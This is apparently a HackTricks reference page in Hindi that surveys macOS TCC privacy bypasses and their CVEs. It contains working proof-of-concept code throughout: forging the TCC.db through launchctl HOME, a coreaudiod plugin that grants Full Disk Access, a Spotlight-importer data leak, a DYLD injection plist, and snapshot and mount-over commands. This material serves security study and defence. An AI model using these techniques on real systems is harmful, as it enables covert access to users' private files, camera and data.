# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## कार्यक्षमता के अनुसार

### Write Bypass

यह bypass नहीं है, TCC इसी तरह काम करता है: **यह लिखने से सुरक्षा नहीं देता**। अगर Terminal **को किसी user के Desktop को पढ़ने की access नहीं है, तब भी वह उसमें लिख सकता है**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

नए **file** में **extended attribute `com.apple.macl`** जोड़ा जाता है, ताकि **creators app** को उसे पढ़ने की अनुमति मिले।<sup>[[2]](#references)</sup>

### TCC ClickJacking

संभव है कि **TCC prompt के ऊपर एक window रखी जाए**, ताकि उपयोगकर्ता को इसका पता चले बिना वह इसे **स्वीकार** कर ले। PoC आपको [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में मिल सकता है।**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### मनमाने नाम से TCC अनुरोध

हमलावर **`Info.plist` में किसी भी नाम** (जैसे Finder, Google Chrome...) वाले **apps बना** सकता है और उनसे TCC-सुरक्षित किसी स्थान तक पहुँच का अनुरोध करवा सकता है। उपयोगकर्ता को लगेगा कि यह पहुँच किसी वैध application ने माँगी है।\
इसके अलावा, **Dock से वैध app हटाकर उसकी जगह नकली app रखना** संभव है। फिर जब उपयोगकर्ता नकली app पर क्लिक करता है (जो उसी icon का उपयोग कर सकता है), तो यह वैध app को चला सकता है, TCC permissions माँग सकता है और malware चला सकता है—जिससे उपयोगकर्ता को लगेगा कि पहुँच वैध app ने माँगी है।<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहाँ मिलेंगे:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

डिफ़ॉल्ट रूप से, **SSH के ज़रिए पहुँच को "Full Disk Access" मिलता था**। इसे अक्षम करने के लिए, इसे सूची में शामिल रखना लेकिन अक्षम करना आवश्यक है (सूची से हटाने पर वे privileges नहीं हटेंगे):<sup>[[2]](#references)</sup>

![TCC अनुरोध, मनमाने नाम से - SSH Bypass: डिफ़ॉल्ट रूप से, SSH के ज़रिए पहुँच को "Full Disk Access" मिलता था। इसे अक्षम करने के लिए, इसे सूची में शामिल रखना लेकिन अक्षम करना आवश्यक है (इसे...](<../../../../../images/image (1077).png>)

यहाँ कुछ **malwares द्वारा इस सुरक्षा को bypass करने** के उदाहरण मिलेंगे:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि अब, SSH को सक्षम करने के लिए **Full Disk Access** आवश्यक है।

### Extensions को handle करना - CVE-2022-26767

फ़ाइलों को **`com.apple.macl`** attribute दिया जाता है, ताकि **किसी खास application को उन्हें पढ़ने की अनुमति** मिले। यह attribute तब सेट होता है, जब किसी फ़ाइल को app पर **drag\&drop** किया जाता है, या जब उपयोगकर्ता किसी फ़ाइल को **default application** में खोलने के लिए उस पर **double-click** करता है।

इसलिए, उपयोगकर्ता **एक malicious app को सभी extensions handle करने के लिए register** कर सकता है और किसी भी फ़ाइल को **खोलने** के लिए Launch Services को call कर सकता है (इससे malicious फ़ाइल को पढ़ने की अनुमति मिल जाएगी)।<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement के ज़रिए **`com.apple.iCloudHelper`** XPC service से संवाद किया जा सकता है, जो **iCloud tokens उपलब्ध कराती है**।

**iMovie** और **Garageband** के पास यह और अन्य entitlements थे, जो इसकी अनुमति देते थे।

इस entitlement से **iCloud tokens प्राप्त करने** के exploit के बारे में अधिक **जानकारी** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Darwin notification names के ज़रिए Spotlight importer से data leakage

Spotlight importer, Spotlight द्वारा अपने `GetMetadataForFile` callback को दी गई फ़ाइल पढ़ सकता है, भले ही Full Disk Access के बिना कोई सामान्य process उसे न पढ़ सके। [TCC-authorized process में code injection](../macos-tcc-credential-and-data-theft.md) के विपरीत, इसके लिए ऐसा local foothold चाहिए जो importer install कर सके और Spotlight indexing event से मेल खाए। Importer sandboxed होता है, लेकिन केवल नाम वाले Darwin notifications के ज़रिए bytes को उस sandbox के बाहर मौजूद listener तक पहुँचाया जा सकता है। यह data-leak channel है, importer से root या मनमानी फ़ाइलों तक पहुँचने का रास्ता नहीं।<sup>[[24]](#references)</sup>

Importer के `Info.plist` में `CFBundleDocumentTypes` → `LSItemContentTypes` के तहत target file type घोषित करें, फिर bundle को `~/Library/Spotlight/` या किसी app के `Contents/Library/Spotlight/` में install करें। `mdimport -L` से registration जाँचें। [Spotlight importer section](../../../../macos-auto-start-locations.md#spotlight-plugins) में bundle placement और file-type matching की जानकारी है। Importer को केवल वही फ़ाइलें मिलती हैं जिनके लिए Spotlight उसे चुनता है; आम तौर पर पहले से मौजूद importer को प्राथमिकता मिलती है। macOS 26 Tahoe पर, रिपोर्ट किए गए tests में `mdimport -i` से immediate recursive indexing विश्वसनीय रूप से force नहीं हुई, जबकि `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ने उस importer द्वारा claim किए गए UTIs को reimport करने का अनुरोध किया।<sup>[[24]](#references)</sup>

Channel test करने के लिए, sandbox के बाहर `notifyutil -w TEST_TEST_TEST` से listener शुरू करें, फिर `CFNotificationCenterGetDarwinNotifyCenter()` और `NULL` object तथा `userInfo` के साथ notification post करें। `userInfo` payload वाले distributed notification के विपरीत, Darwin notification में केवल उसका name होता है। Binary data के लिए, `notify_register_dispatch` का उपयोग करके बाहरी listener को decimal names `0` से `255` तक register करें; हर callback के registration को उसके byte value से map करें। `GetMetadataForFile` के भीतर, केवल Spotlight द्वारा दिए गए `pathToFile` को पढ़ें और हर byte को decimal notification name के रूप में भेजें:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener byte sequence को reconstruct करता है, TCC-protected file को खुद नहीं पढ़ता। प्रकाशित PoC ने macOS 26 पर SIP enabled होने के बावजूद, non-FDA terminal से `knowledgeC.db` के पहले 64 bytes recover किए। इसकी bandwidth कम है और यह bulk-copy का भरोसेमंद तरीका नहीं है: Spotlight किसी target file को index या reindex नहीं कर सकता, और concurrent importer instances notification streams को interleave कर सकते हैं। अन्य sandbox-boundary mechanisms के लिए [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) देखें।<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

जिस app के पास **`kTCCServiceAppleEvents`** permission है, वह **दूसरे Apps को control** कर सकेगा। इसका मतलब है कि वह **दूसरे Apps को दी गई permissions का दुरुपयोग** कर सकता है।<sup>[[2]](#references)</sup>

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, अगर किसी App के पास **`iTerm` पर Automation permission** है, तो इस उदाहरण में **`Terminal`** के पास iTerm का access है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास FDA है, और actions करने के लिए उसका इस्तेमाल कर सकता है:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder के माध्यम से

या अगर किसी App को Finder के माध्यम से access है, तो वह इस तरह की script चला सकता है:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## App के व्यवहार के अनुसार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

यूज़रस्पेस **tccd daemon** TCC users database को यहाँ से access करने के लिए **`HOME`** **env** variable का उपयोग करता था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon मौजूदा user के domain में `launchd` के ज़रिए चल रहा है, इसलिए उसे पास किए जाने वाले **सभी environment variables को नियंत्रित करना** संभव है।<sup>[[19]](#references)</sup>\
इसलिए, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **नियंत्रित** **directory** की ओर point कर सकता है, TCC daemon को **restart** कर सकता है, और फिर **TCC database को सीधे modify करके** end user से कोई prompt दिखाए बिना खुद को **हर उपलब्ध TCC entitlement दे सकता है**।<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes को TCC-सुरक्षित स्थानों तक पहुँच थी, लेकिन नया बनाया गया note **गैर-सुरक्षित स्थान पर संग्रहीत होता था**। इसलिए, हमलावर Notes से किसी सुरक्षित फ़ाइल को note में कॉपी करने के लिए कह सकता था और फिर गैर-सुरक्षित स्थान से परिणामी डेटा तक पहुँच सकता था:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` लाइब्रेरी वाला binary `/usr/libexec/lsd`, `com.apple.private.nullfs_allow` entitlement के साथ आया था, जो उसे **nullfs** mount बनाने की अनुमति देता था। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ `com.apple.private.tcc.allow` entitlement भी था, जिससे वह हर फ़ाइल तक पहुँच सकता था।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को कॉल करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर मौजूद सभी documents तक **पहुँचा** जा सकता था।

### CVE-2024-44131 - FileProvider symlink race

जो apps फ़ाइल operations **privileged helper** (यहाँ **`fileproviderd`** / `Files.app`) को सौंपते हैं, वे user की ओर से items कॉपी या move करते हैं, इसलिए copy caller के बजाय helper के privileges के साथ चलती है।

Jamf Threat Labs ने दिखाया कि operation से पहले की जाने वाली symlink validation में **race** किया जा सकता है: **आख़िरी** path component (जिसे जाँचा जाता है) पर symlink लगाने के बजाय, attacker **copy शुरू हो जाने के बाद** path की किसी **बीच वाली** directory को बदल देता है। फिर privileged helper attacker-नियंत्रित link को follow करता है और बिना कोई prompt दिखाए TCC-सुरक्षित स्थानों को पढ़ता/लिखता है।<sup>[[5]](#references)</sup>

ऐसी directories, जिनके path में random UUID से **सुरक्षा नहीं की गई है** (उदाहरण के लिए `~/Library/Mobile Documents/com~apple~CloudDocs`), सबसे आसान targets हैं, क्योंकि attacker race करने के लिए पूरा path पहले से जान सकता है।

> [!TIP]
> यह देखने के लिए generic pattern है: **कोई भी privileged process जो किसी path को एक से ज़्यादा बार resolve करता है** (check-then-use, या `rename()`/`copyfile()` द्वारा source और destination को अलग-अलग resolve करना), path के बीच की directory को बदलकर race किया जा सकता है। केवल `O_NOFOLLOW_ANY`, पहले से खुले directory FD पर `openat()`, या `realpath()` + re-validation ही इस मौके को वास्तव में बंद करते हैं।

ज़्यादा जानकारी के लिए [**Jamf Threat Labs की writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) देखें।<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` को `SQLITE_ENABLE_SQLLOG` के साथ build किया जा सकता है, जिससे environment variables द्वारा नियंत्रित logging hook जुड़ता है ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **खोले गए हर database** के लिए, database file की एक **copy** और SQL statements का log `path` में लिखा जाता है (directory का पहले से मौजूद होना ज़रूरी है)।
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB को खोलने/attach करने पर हर बार मौजूदा file दोबारा इस्तेमाल करने के बजाय **नई copy लें**।
- **`SQLITE_SQLLOG_CONDITIONAL`** – connection को तभी log करें, जब main DB के पास `<database>-sqllog` file मौजूद हो।

अगर आप इस variable को ऐसे process में inject कर सकते हैं जिसके पास **FDA** है और जो SQLite databases खोलता है, तो वह खुशी-खुशी उन सुरक्षित databases को आपके नियंत्रण वाली directory में **कॉपी कर देगा**। क्योंकि destination filename attacker-नियंत्रित data से बनता है, destination पर लगाया गया **symlink** इसी primitive को target process के privileges के साथ **arbitrary file write** में बदल देता है।

### **SQLITE_AUTO_TRACE**

अगर environment variable **`SQLITE_AUTO_TRACE`** set हो, तो **`libsqlite3.dylib`** library सभी SQL queries को **log** करना शुरू कर देगी। कई applications इस library का इस्तेमाल करती थीं, इसलिए उनकी सभी SQLite queries log करना संभव था।<sup>[[22]](#references)</sup>

कई Apple applications TCC-सुरक्षित जानकारी तक पहुँचने के लिए इस library का इस्तेमाल करती थीं।

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### environment variable से संचालित file writes की खोज

पिछली दो entries एक ही generic technique के उदाहरण हैं, और ऐसे और उदाहरण खोजना उपयोगी है: **TCC-privileged apps में load किए गए frameworks अक्सर debug/logging environment variables उपलब्ध कराते हैं, जिनसे process caller द्वारा नियंत्रित path पर file बना सकता है**।

इन्हें खोजने का workflow:

1. FDA या कोई अन्य उपयोगी TCC permission वाले target को चुनें (`Music`, `TV`, `Terminal`, MDM agents...) और उन frameworks की सूची बनाएँ जिनसे वह link होता है (`otool -L`, `vmmap`)।
2. उन frameworks में `getenv` strings खोजें: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`।
3. `launchctl setenv NAME /path/you/control` से candidate variables सेट करें, app launch करें और `fs_usage -w -f filesys <pid>` या `sudo fs_usage | grep <path>` से filesystem पर उसकी गतिविधि देखें।
4. अगर process आपकी directory में कोई file **बनाता या rename करता है**, तो आपके पास write primitive है: destination को symlink पर सेट करें (या बीच की directory में race करें, जैसा ऊपर CVE-2024-44131 में है), ताकि write को `~/Library/Application Support/com.apple.TCC/TCC.db` पर redirect किया जा सके।

> [!TIP]
> इस पर दो बातें सीमाएँ लगाती हैं। पहली, hardened-runtime binaries के लिए **`DYLD_*` variables अनदेखे किए जाते हैं**, जब तक app में [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement न हो ("एक Boolean value जो बताती है कि app dynamic linker environment variables से प्रभावित हो सकता है या नहीं; इनका उपयोग app के process में code inject करने के लिए किया जा सकता है") — यह भी देखें [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)। दूसरी, Apple framework की debug variables की report मिलने पर उन्हें हटाता रहता है, इसलिए जो variable macOS के एक release पर काम करता था, वह अक्सर अगले release में हट चुका होता है। अगर कोई variable सेट करने के बाद app बिना कोई संदेश दिए launch होने से मना कर दे, तो उस variable को पहले से filtered मानें।<sup>[[7]](#references)[[8]](#references)</sup>

Linker variables के साथ इसी तरह की तरकीब के लिए [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) देखें।

### Apple Remote Desktop

Root के रूप में आप इस service को enable कर सकते हैं और **ARD agent को full disk access मिलेगा**। इसके बाद कोई user इसका दुरुपयोग करके इससे एक नया **TCC user database** copy करवा सकता है।

## **NFSHomeDirectory** द्वारा

TCC, user-विशिष्ट resources तक access नियंत्रित करने के लिए user के HOME folder में database का उपयोग करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, अगर user `$HOME` environment variable को **किसी अलग folder** की ओर point करके TCC को restart करवा सके, तो वह **/Library/Application Support/com.apple.TCC/TCC.db** में नया TCC database बना सकता है और TCC को किसी भी app को कोई भी TCC permission देने के लिए बरगला सकता है।

> [!TIP]
> ध्यान दें कि Apple **`$HOME` की value** के लिए user profile में **`NFSHomeDirectory`** attribute में रखी setting का उपयोग करता है। इसलिए, अगर आप ऐसी application compromise कर लेते हैं जिसके पास इस value को बदलने की permission (**`kTCCServiceSystemPolicySysAdminFiles`**) है, तो TCC bypass के साथ इस विकल्प को **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC**, user के **HOME** folder को बदलने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है।

1. Target app के लिए _csreq_ blob प्राप्त करें।
2. ज़रूरी access और _csreq_ blob वाली एक नकली _TCC.db_ file रखें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) से user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry में बदलाव करें।
5. बदली हुई Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) से import करें।
6. User के _tccd_ को रोकें और process को reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` entitlement में `kTCCServiceSystemPolicySysAdminFiles` value थी।\
**`configd`** को **`-t`** option के साथ चलाना संभव था, जिससे attacker **load करने के लिए custom Bundle निर्दिष्ट** कर सकता था। इसलिए, exploit में user की home directory बदलने के लिए **`dsexport`** और **`dsimport`** method की जगह **`configd` code injection** का उपयोग किया गया।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।<sup>[[11]](#references)</sup>

## Process injection द्वारा

किसी process में code inject करने और उसके TCC privileges का दुरुपयोग करने की कई techniques हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass के लिए मिलने वाला सबसे आम process injection **plugins (load library)** के ज़रिए होता है।\
Plugins अतिरिक्त code होते हैं, आम तौर पर libraries या plist के रूप में, जिन्हें **main application load करता है** और जो उसी के context में execute होते हैं। इसलिए, अगर main application को TCC-restricted files तक access था (granted permissions या entitlements के ज़रिए), तो **custom code को भी access मिलेगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करता था और इसमें hardened runtime **नहीं था**।

इस CVE को weaponize करने के लिए, **`NFSHomeDirectory`** को (पिछले entitlement का दुरुपयोग करके) **बदला जाता है**, ताकि user का TCC database **कब्ज़े में लेकर** TCC bypass किया जा सके।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था**, और दूसरा इसे **TCC manage करने की access** देता था।

यह binary `/Library/Audio/Plug-Ins/HAL` folder से **third-party plug-ins** load कर सकती थी। इसलिए, इस PoC से **plugin load करना और TCC permissions का दुरुपयोग करना** संभव था:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O के ज़रिए camera stream खोलने वाले system applications (`kTCCServiceCamera` वाले apps), `/Library/CoreMediaIO/Plug-Ins/DAL` में मौजूद इन plugins को **अपने process में लोड करते हैं** (यह SIP द्वारा प्रतिबंधित नहीं है)।

वहाँ केवल एक common **constructor** वाली library रखने से **code inject** हो जाएगा।

Apple के कई applications इसके प्रति vulnerable थे।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

इसका आसानी से exploit करने के बारे में अधिक जानकारी के लिए [**मूल रिपोर्ट देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` के पास **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** entitlements थे, जिनकी मदद से process के अंदर code inject करना और TCC privileges का इस्तेमाल करना संभव था।

### CVE-2023-26818 - Telegram

Telegram के पास **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** entitlements थे, इसलिए इसका दुरुपयोग करके **इसकी permissions तक पहुंच पाना** संभव था, जैसे camera से recording करना। आप [**writeup में payload पा सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

ध्यान दें कि library load करने के लिए env variable का इस्तेमाल करने हेतु, इस library को inject करने के लिए एक **custom plist** बनाई गई थी और इसे launch करने के लिए **`launchctl`** का इस्तेमाल किया गया था:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## open invocations द्वारा

Sandboxed होने पर भी **`open`** को invoke करना संभव है

### Terminal Scripts

Terminal को **Full Disk Access (FDA)** देना काफी आम है, कम से कम tech लोगों द्वारा इस्तेमाल किए जाने वाले computers में। इसके साथ **`.terminal`** scripts को invoke करना भी संभव है।

**`.terminal`** scripts plist files होती हैं, जैसे यह file, जिसमें execute करने के लिए command **`CommandString`** key में होती है:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

कोई application `/tmp` जैसी जगह पर terminal script लिख सकता है और उसे इस तरह के command से launch कर सकता है:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## माउंट करके

### CVE-2020-9771 - mount_apfs TCC bypass और privilege escalation

**कोई भी user** (यहाँ तक कि unprivileged user भी) Time Machine snapshot बना और mount कर सकता है और उस snapshot की **सभी files को access** कर सकता है।\
इसके लिए आवश्यक **एकमात्र privileged access** यह है कि इस्तेमाल किए गए application (जैसे `Terminal`) को **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) दिया गया हो, जिसे किसी admin को grant करना होगा।<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में मिल सकती है**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC फ़ाइल पर Mount करना

भले ही TCC DB फ़ाइल सुरक्षित हो, फिर भी **डायरेक्टरी पर mount करके** एक नई TCC.db फ़ाइल रखना संभव था:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में **full exploit** देखें।<sup>[[21]](#references)</sup>

### CVE-2024-40855

